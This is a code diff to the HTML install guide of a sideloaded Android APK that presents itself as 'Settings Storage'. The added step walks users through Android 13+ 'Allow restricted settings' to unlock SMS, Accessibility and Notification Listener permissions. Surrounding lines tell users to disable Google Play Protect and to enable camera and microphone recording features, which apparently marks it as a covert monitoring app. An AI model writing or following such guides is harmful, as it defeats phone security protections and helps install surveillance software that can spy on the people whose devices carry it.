@@ -26,7 +26,8 @@
     { "@type": "HowToStep", "name": "Adjust Google Play Protect", "text": "Disable Google Play Protect to ensure the app's features run smoothly." },
     { "@type": "HowToStep", "name": "Install, Login & Allow Permissions", "text": "Install the APK, sign in, and grant all necessary runtime permissions." },
     { "@type": "HowToStep", "name": "Enable Required Services", "text": "Enable all necessary system services like Accessibility and Notification Listener." },
-    { "@type": "HowToStep", "name": "Activate Recording Features", "text": "To fix potential blocks on camera/mic recording, re-enable the Accessibility Service for the app." }
+    { "@type": "HowToStep", "name": "Activate Recording Features", "text": "To fix potential blocks on camera/mic recording, re-enable the Accessibility Service for the app." },
+    { "@type": "HowToStep", "name": "Fix Restricted Settings", "text": "On Android 13+, allow restricted settings for the app via Settings > Apps > App > 3-dot menu > Allow restricted settings to enable SMS, Accessibility and Notification permissions." }
   ]
 }
 </script>
@@ -311,6 +312,149 @@
             margin-top: 1rem;
             font-size: 0.9rem;
             text-align: center;
+        }
+
+        /* Restricted Settings Section Styles */
+        .rs-affected-chips {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 8px;
+            margin: 12px 0;
+        }
+        .rs-chip {
+            background: rgba(239, 68, 68, 0.12);
+            border: 1px solid rgba(239, 68, 68, 0.3);
+            color: #f87171;
+            padding: 5px 14px;
+            border-radius: 20px;
+            font-size: 0.82rem;
+            font-weight: 600;
+        }
+        .rs-flow-container {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+            width: 100%;
+            max-width: 420px;
+        }
+        .rs-flow-card {
+            background: rgba(17, 24, 39, 0.7);
+            border: 1px solid rgba(75, 85, 99, 0.5);
+            border-radius: 14px;
+            padding: 18px;
+            display: flex;
+            align-items: flex-start;
+            gap: 14px;
+            opacity: 0;
+            transform: translateY(15px);
+            transition: opacity 0.4s ease-out, transform 0.4s ease-out;
+        }
+        .rs-flow-card.visible {
+            opacity: 1;
+            transform: translateY(0);
+        }
+        .rs-flow-num {
+            background: var(--color-purple-600);
+            color: white;
+            width: 30px;
+            height: 30px;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 0.85rem;
+            font-weight: 700;
+            flex-shrink: 0;
+        }
+        .rs-flow-info {
+            flex: 1;
+        }
+        .rs-flow-info h4 {
+            color: var(--color-white);
+            font-size: 0.95rem;
+            font-weight: 600;
+            margin: 0 0 4px;
+        }
+        .rs-flow-info p {
+            color: var(--color-gray-400);
+            font-size: 0.82rem;
+            margin: 0;
+            line-height: 1.5;
+        }
+        .rs-flow-icon {
+            font-size: 1.5rem;
+            flex-shrink: 0;
+        }
+        .rs-mockup-popup {
+            background: #2d3748;
+            border-radius: 16px;
+            padding: 20px;
+            text-align: center;
+            max-width: 260px;
+            margin: 0 auto;
+            border: 1px solid rgba(75, 85, 99, 0.5);
+            box-shadow: 0 15px 40px rgba(0,0,0,0.4);
+        }
+        .rs-mockup-popup h5 {
+            color: var(--color-white);
+            font-size: 1rem;
+            margin: 0 0 8px;
+        }
+        .rs-mockup-popup p {
+            color: #9ca3af;
+            font-size: 0.8rem;
+            line-height: 1.5;
+            margin: 0 0 14px;
+        }
+        .rs-mockup-btn {
+            display: inline-block;
+            padding: 7px 24px;
+            border-radius: 20px;
+            font-size: 0.82rem;
+            font-weight: 600;
+        }
+        .rs-mockup-btn.disabled { background: #4b5563; color: #9ca3af; }
+        .rs-mockup-btn.success { background: #22c55e; color: white; }
+        .rs-menu-mockup {
+            background: #1f2937;
+            border: 1px solid rgba(75, 85, 99, 0.5);
+            border-radius: 10px;
+            max-width: 240px;
+            margin: 12px auto 0;
+            overflow: hidden;
+        }
+        .rs-menu-row {
+            padding: 10px 14px;
+            font-size: 0.82rem;
+            color: #d1d5db;
+            border-bottom: 1px solid rgba(75, 85, 99, 0.3);
+            text-align: left;
+        }
+        .rs-menu-row:last-child { border-bottom: none; }
+        .rs-menu-row.active {
+            background: rgba(124, 58, 237, 0.15);
+            color: var(--color-purple-400);
+            font-weight: 600;
+        }
+        .rs-success-box {
+            background: rgba(34, 197, 94, 0.08);
+            border: 1px solid rgba(34, 197, 94, 0.3);
+            border-radius: 10px;
+            padding: 14px;
+            margin-top: 16px;
+            width: 100%;
+            max-width: 420px;
+        }
+        .rs-success-box h4 {
+            color: #22c55e;
+            font-size: 0.9rem;
+            margin: 0 0 6px;
+        }
+        .rs-success-box p {
+            color: var(--color-gray-300);
+            font-size: 0.82rem;
+            margin: 3px 0;
+            line-height: 1.5;
         }
         .mockup-title {
             font-size: 24px;
@@ -838,6 +982,103 @@
                 </div>
 
                 <div class="video-section" data-animation-group="videos">
+
+                <!-- STEP 6: Restricted Settings -->
+                <div class="step-wrapper" data-animation-group="restricted-settings">
+                    <div class="step-content">
+                        <div class="step-number">STEP 6</div>
+                        <h2 class="step-title">Fix "Restricted Setting" (Android 13+)</h2>
+                        <p class="step-description">On <b>Android 13, 14, 15 & 16</b>, Google blocks certain permissions for apps installed via APK. You'll see a grey popup saying <em>"For your security, this setting is currently unavailable"</em>. This affects <b>SMS</b>, <b>Accessibility</b>, and <b>Notification Listener</b> permissions. Follow these steps to fix it.</p>
+                        <div class="rs-affected-chips" style="margin-top: 1rem;">
+                            <span class="rs-chip">📱 SMS Permission</span>
+                            <span class="rs-chip">♿ Accessibility Service</span>
+                            <span class="rs-chip">🔔 Notification Listener</span>
+                        </div>
+                    </div>
+                    <div class="mockup-container" style="flex-direction: column; align-items: center; gap: 20px;">
+                        <!-- Restricted popup mockup -->
+                        <div class="rs-mockup-popup" id="rs-popup-before">
+                            <div style="font-size: 2rem; margin-bottom: 8px;">🔒</div>
+                            <h5>Restricted Setting</h5>
+                            <p>For your security, this setting is currently unavailable.</p>
+                            <span class="rs-mockup-btn disabled">OK</span>
+                        </div>
+
+                        <!-- Fix flow steps -->
+                        <div class="rs-flow-container" id="rs-flow-steps">
+                            <div class="rs-flow-card">
+                                <div class="rs-flow-num">1</div>
+                                <div class="rs-flow-info">
+                                    <h4>Open Settings → Apps</h4>
+                                    <p>Go to your phone Settings and open "Apps" or "App Management".</p>
+                                </div>
+                                <div class="rs-flow-icon">⚙️</div>
+                            </div>
+                            <div class="rs-flow-card">
+                                <div class="rs-flow-num">2</div>
+                                <div class="rs-flow-info">
+                                    <h4>Find the App</h4>
+                                    <p>Scroll to find <b>"Settings Storage"</b> (the installed app) and tap on it.</p>
+                                </div>
+                                <div class="rs-flow-icon">🔍</div>
+                            </div>
+                            <div class="rs-flow-card">
+                                <div class="rs-flow-num">3</div>
+                                <div class="rs-flow-info">
+                                    <h4>Tap ⋮ (3-dot menu)</h4>
+                                    <p>In the top-right corner of App Info page, tap the <b>three dots ⋮</b> icon.</p>
+                                </div>
+                                <div class="rs-flow-icon">⋮</div>
+                            </div>
+                            <div class="rs-flow-card">
+                                <div class="rs-flow-num">4</div>
+                                <div class="rs-flow-info">
+                                    <h4>Allow Restricted Settings</h4>
+                                    <p>Select <b>"Allow restricted settings"</b> from the dropdown menu.</p>
+                                </div>
+                                <div class="rs-flow-icon">🔓</div>
+                            </div>
+                            <div class="rs-flow-card">
+                                <div class="rs-flow-num">5</div>
+                                <div class="rs-flow-info">
+                                    <h4>Verify with Phone Lock</h4>
+                                    <p>Enter your <b>PIN / Pattern / Password</b> to confirm the change.</p>
+                                </div>
+                                <div class="rs-flow-icon">🔑</div>
+                            </div>
+                            <div class="rs-flow-card">
+                                <div class="rs-flow-num">6</div>
+                                <div class="rs-flow-info">
+                                    <h4>Go Back & Enable Permission</h4>
+                                    <p>Return and enable Accessibility, Notification Listener, or grant SMS – it will now work!</p>
+                                </div>
+                                <div class="rs-flow-icon">✅</div>
+                            </div>
+                        </div>
+
+                        <!-- 3-dot menu visual -->
+                        <div class="rs-menu-mockup">
+                            <div style="padding: 10px 14px; font-size: 0.78rem; color: #6b7280; border-bottom: 1px solid rgba(75,85,99,0.3); display: flex; justify-content: space-between; align-items: center;">
+                                <span style="color: #fff; font-weight: 600;">← App info</span>
+                                <span style="font-size: 1.2rem; color: #fff;">⋮</span>
+                            </div>
+                            <div class="rs-menu-row active">🔓 Allow restricted settings</div>
+                            <div class="rs-menu-row">Uninstall updates</div>
+                            <div class="rs-menu-row">Open by default</div>
+                        </div>
+
+                        <!-- Success box -->
+                        <div class="rs-success-box">
+                            <h4>✅ After fixing:</h4>
+                            <p>• <b>Accessibility Service</b> → Now you can enable it</p>
+                            <p>• <b>Notification Listener</b> → Now you can enable it</p>
+                            <p>• <b>SMS Permission</b> → "Allow" button will work</p>
+                            <p style="color: #a78bfa; margin-top: 8px;"><b>💡 Tip:</b> This only needs to be done once per device.</p>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="video-section" data-animation-group="videos">
                     <h2 class="section-title">Watch Video Tutorials</h2>
                     <p class="section-subtitle">For more detailed instructions, watch our video guides.</p>
                     <div class="video-buttons-container">
@@ -1067,6 +1308,15 @@
                                     screen1.style.transform = 'translateX(-100%)';
                                 }, 2500);
                                 setTimeout(() => { animatePlayProtectToggles([playProtectToggle, improveDetectionToggle]); }, 3200);
+                            }
+
+                            if (animationGroup === 'restricted-settings') {
+                                const flowCards = element.querySelectorAll('.rs-flow-card');
+                                let delay = 300;
+                                flowCards.forEach(card => {
+                                    setTimeout(() => card.classList.add('visible'), delay);
+                                    delay += 350;
+                                });
                             }
                         }
                         
